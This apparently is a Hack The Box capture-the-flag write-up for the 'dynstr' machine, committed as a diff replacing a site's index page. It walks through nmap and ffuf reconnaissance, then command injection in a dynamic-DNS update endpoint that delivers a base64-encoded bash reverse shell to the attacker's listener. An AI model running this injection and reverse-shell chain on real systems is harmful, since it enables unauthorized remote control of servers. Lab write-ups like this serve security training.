@@ -1,4 +1,126 @@
----
-layout: home
-# Index page
----
+<h1>Port</h1>
+<table>
+<thead>
+<tr>
+<th>port</th>
+<th>service</th>
+<th>version</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>80</td>
+<td>http</td>
+<td>Apache httpd 2.4.41</td>
+</tr>
+<tr>
+<td>22</td>
+<td>ssh</td>
+<td>Ubuntu 4ubuntu0.2</td>
+</tr>
+<tr>
+<td>53</td>
+<td>domain</td>
+<td>ISC BIND 9.16.1</td>
+</tr>
+</tbody>
+</table>
+<h1>Nmap</h1>
+<pre><code class="language-bash"><span class="hljs-comment"># Nmap 7.91 scan initiated Sun Jun 13 10:07:20 2021 as: nmap -T5 -p- -sCV --min-rate 25000 -oN nmap/alnmap.txt --vv 10.10.10.244</span>
+Increasing send delay <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.244</span> from <span class="hljs-number">0</span> to <span class="hljs-number">5</span> due to <span class="hljs-number">9067</span> out of <span class="hljs-number">22667</span> dropped probes since last increase.
+Warning: <span class="hljs-number">10.10</span>.<span class="hljs-number">10.244</span> giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (<span class="hljs-number">2</span>).
+Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.244</span>
+Host is up, received reset ttl <span class="hljs-number">63</span> (<span class="hljs-number">0.25</span>s latency).
+Scanned at <span class="hljs-number">2021</span>-<span class="hljs-number">06</span>-<span class="hljs-number">13</span> <span class="hljs-number">10</span>:<span class="hljs-number">07</span>:<span class="hljs-number">21</span> IST <span class="hljs-keyword">for</span> <span class="hljs-number">39</span>s
+Not shown: <span class="hljs-number">38109</span> filtered ports, <span class="hljs-number">27423</span> closed ports
+Reason: <span class="hljs-number">38109</span> no-responses and <span class="hljs-number">27423</span> resets
+PORT   STATE SERVICE REASON         VERSION
+<span class="hljs-number">22</span>/tcp open  ssh     syn-ack ttl <span class="hljs-number">63</span> OpenSSH <span class="hljs-number">8.2</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0.<span class="hljs-number">2</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)
+| ssh-hostkey: 
+|   <span class="hljs-number">3072</span> <span class="hljs-number">05</span>:<span class="hljs-number">7</span>c:<span class="hljs-number">5</span>e:b1:<span class="hljs-number">83</span>:f9:<span class="hljs-number">4</span>f:ae:<span class="hljs-number">2</span>f:<span class="hljs-number">08</span>:e1:<span class="hljs-number">33</span>:ff:f5:<span class="hljs-number">83</span>:<span class="hljs-number">9</span>e (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC//sbOTQwLRH4CGj3riDnnTvTCiJT1Uz7CyRSD2Tkh2wkT20rtAq13c5M1LC2kxki2bz9Ptxxx340Cc9tAcQaPZbmHndQe/H1bGiVZCKjOl2WqWQTV9fq6GGtflC94BkkLrmkWHzqg+S50g2Zg0iesPMkKAmwqwEVZx9npe1QuF3RQu5EYQXRYVOzpqQdU+jRD267gCvsKp9xmr7trZ1UzFxfBUOzSCWa3Adm2TTFwiA5jTb6x0lKVnQtgKghioMQeXXPuiTLCbI0XfbksoRI2OBAvTZf7RsIthKCiyCQRWjVh5Idr5Fh7GgwYaDgW662W3V3hCNEQRY8R9/fXWdVho1gWbm6NFt+NyRO/<span class="hljs-number">6</span>F2XDvPseBYr+Yi6zwGEM+PpsTi5dfj8yYKRZ3HFXwjeBGjCPMRe9XPpCvvDnHAF18B1INVJPSwAIVll365V5D18JslQh7PpAWxO70TzmEC9E+UPXOrt29tZ0Zi/uApFRM700pdOhnvcs8q4RBWaUpp3ZB0=
+|   <span class="hljs-number">256</span> <span class="hljs-number">3</span>f:<span class="hljs-number">73</span>:b4:<span class="hljs-number">95</span>:<span class="hljs-number">72</span>:ca:<span class="hljs-number">5</span>e:<span class="hljs-number">33</span>:f6:<span class="hljs-number">8</span>a:<span class="hljs-number">8</span>f:<span class="hljs-number">46</span>:cf:<span class="hljs-number">43</span>:<span class="hljs-number">35</span>:b9 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFtYzp8umMbm7o9+<span class="hljs-number">1</span>LUTVio/dduowE/AsA3rO52A5Q/Cuct9GY6IZEvPE+/XpEiNCPMSl991kjHT+WaAunmTbT4=
+|   <span class="hljs-number">256</span> cc:<span class="hljs-number">0</span>a:<span class="hljs-number">41</span>:b7:a1:<span class="hljs-number">9</span>a:<span class="hljs-number">43</span>:da:<span class="hljs-number">1</span>b:<span class="hljs-number">68</span>:f5:<span class="hljs-number">2</span>a:f8:<span class="hljs-number">2</span>a:<span class="hljs-number">75</span>:<span class="hljs-number">2</span>c (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOz8b9MDlSPP5QJgSHy6fpG98bdKCgvqhuu07v5NFkdx
+<span class="hljs-number">53</span>/tcp open  domain  syn-ack ttl <span class="hljs-number">63</span> ISC BIND <span class="hljs-number">9.16</span>.<span class="hljs-number">1</span> (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: <span class="hljs-number">9.16</span>.<span class="hljs-number">1</span>-Ubuntu
+<span class="hljs-number">80</span>/tcp open  http    syn-ack ttl <span class="hljs-number">63</span> Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">41</span> ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">41</span> (Ubuntu)
+|_http-title: Dyna DNS
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span class="hljs-comment"># Nmap done at Sun Jun 13 10:08:00 2021 -- 1 IP address (1 host up) scanned in 40.07 seconds</span>
+</code></pre>
+<h1>Domain names from main web page</h1>
+<p><img src="https://i.imgur.com/Z3kZg57.png" alt=""></p>
+<p><img src="https://i.imgur.com/Lq6EBQg.png" alt=""></p>
+<ul>
+<li>dnsalias.htb<a href="http://dnsalias.htb"></a></li>
+<li>dynamicdns.htb<a href="http://dynamicdns.htb"></a></li>
+<li>no-ip.htb<a href="http://no-ip.htb"></a></li>
+<li>dns.dyna.htb<a href="http://dns.dyna.htb"></a></li>
+<li>dyna.htb<a href="http://dyna.htb"></a></li>
+</ul>
+<p>** i have  run aquatone to check all webpage at same time**</p>
+<p><img src="https://i.imgur.com/JFcoPkt.png" alt=""></p>
+<p>**All Pages looks same **</p>
+<p><img src="https://i.imgur.com/earjnRA.png" alt=""></p>
+<h1>Looking Dns Recon</h1>
+<pre><code class="language-bash">dns1.dyna.htb
+</code></pre>
+<p><img src="https://i.imgur.com/GsNnIqp.png" alt=""></p>
+<p><img src="https://i.imgur.com/QFv1ktB.png" alt=""></p>
+<h1>FUFF Found a directory</h1>
+<pre><code class="language-bahs">http://dyna.htb/nic/update/
+</code></pre>
+<pre><code class="language-bash">╭─root@kali ~/Desktop/htb/dynstr ‹master*› 
+╰─<span class="hljs-comment"># ffuf -w /opt/wordlists/medium.txt   -u http://dyna.htb/nic/FUZZ -e .php,.html,.txt, -t 100  | tee ffuf/ffuf.out </span>
+
+        /<span class="hljs-string">'___\  /'</span>___\           /<span class="hljs-string">'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://dyna.htb/nic/FUZZ
+ :: Wordlist         : FUZZ: /opt/wordlists/medium.txt
+ :: Extensions       : .php .html .txt  
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 100
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+index.html              [Status: 200, Size: 0, Words: 1, Lines: 1]
+update                  [Status: 200, Size: 8, Words: 1, Lines: 2]
+update                  [Status: 200, Size: 8, Words: 1, Lines: 2]
+
+</span></code></pre>
+<p><img src="https://i.imgur.com/Kpf7Yqs.png" alt=""></p>
+<p>while checking dyna update an article</p>
+<pre><code class="language-bash">curl -X GET <span class="hljs-string">'http://dynadns:sndanyd@dyna.htb/nic/update?hostname=`echo+"YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjUvNDQ0NCA8JjEK"+|+base64+-d|+bash`"dynadns.no-ip.htb&amp;myip=10.10.14.5'</span> --proxy <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8080</span>
+</code></pre>
+<p><img src="https://i.imgur.com/wfnSG88.png" alt=""></p>
+<p>so we can  inject  commands hostname here ..................!!!</p>
+<h1>reverse shell</h1>
+<p>creating a base 64 reverse shell</p>
+<pre><code class="language-bash">╭─root@kali ~/Desktop/htb/dynstr ‹master*› 
+╰─<span class="hljs-comment"># echo "bash -i &amp;&gt;/dev/tcp/10.10.14.5/4444 &lt;&amp;1" | base64</span>
+YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjUvNDQ0NCA8JjEK
+</code></pre>
+<p><img src="https://i.imgur.com/XJqaoKD.png" alt=""></p>
+<pre><code class="language-bash">curl -X GET <span class="hljs-string">'http://dynadns:sndanyd@dyna.htb/nic/update?hostname=`echo+"YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjUvNDQ0NCA8JjEK"+|+base64+-d|+bash`"dynadns.no-ip.htb&amp;myip=10.10.14.5'</span>
+</code></pre>
+<p><img src="https://i.imgur.com/tra1cCI.png" alt=""></p>
